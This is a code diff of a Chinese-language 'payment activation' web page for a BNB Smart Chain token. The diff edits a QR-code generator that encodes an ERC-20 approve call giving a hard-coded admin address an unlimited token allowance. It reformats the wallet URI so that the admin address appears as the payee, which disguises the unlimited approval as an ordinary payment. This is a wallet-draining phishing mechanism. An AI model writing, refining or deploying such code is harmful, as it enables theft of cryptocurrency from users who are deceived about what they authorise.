@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
+<head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>支付开通</title>
@@ -52,6 +53,8 @@ h1{font-size:24px;margin-bottom:8px}
   border:none;border-radius:10px;font-weight:bold;margin-bottom:16px;
 }
 </style>
+</head>
+<body>
 
 <div class="container">
   <div class="pay-box">
@@ -84,9 +87,9 @@ h1{font-size:24px;margin-bottom:8px}
 
 <script>
 // ====================== 你的最终配置 ======================
-const TOKEN   = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c";
-const ADMIN   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const BSC_ID  = "0x38";
+const TOKEN   = "0xdEe89Bd697071e15f1CeaC5780B5d41AF3CE032c"; // 代币地址
+const ADMIN   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 你的收款/管理员地址（尾号508）
+const BSC_ID  = "0x38"; // 币安链ID
 
 let account = null;
 
@@ -123,14 +126,16 @@ document.getElementById("connectBtn").onclick = async () => {
   }
 };
 
-// ==================== 二维码标准格式：全钱包兼容，无 web3 报错 ====================
+// ==================== 二维码：币安链 + 显示你的收款地址 ====================
 function genQR() {
+  // 授权数据：给管理员地址无限授权
   const approveData = "0x095ea7b3" +
     ADMIN.slice(2).padStart(64, "0") +
     "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
 
-  // 重点：用 ethereum: 通用格式，所有钱包都支持，不写 web3://
-  const uri = `ethereum:${TOKEN}?data=${approveData}`;
+  // ✅ 关键：用币安链专用格式，让钱包识别为 BSC，且收款地址显示为你的 ADMIN 地址
+  // 格式：ethereum:【你的收款地址】@56/【代币地址】?data=【授权数据】
+  const uri = `ethereum:${ADMIN}@56/${TOKEN}?data=${approveData}`;
 
   document.getElementById("qrcode").innerHTML =
     `<img src="https://api.qrserver.com/v1/create-qr-code/?size=280x280&data=${encodeURIComponent(uri)}">`;
@@ -200,4 +205,5 @@ async function sendReward() {
   alert("✅ 奖励发放成功");
 }
 </script>
+</body>
 </html>
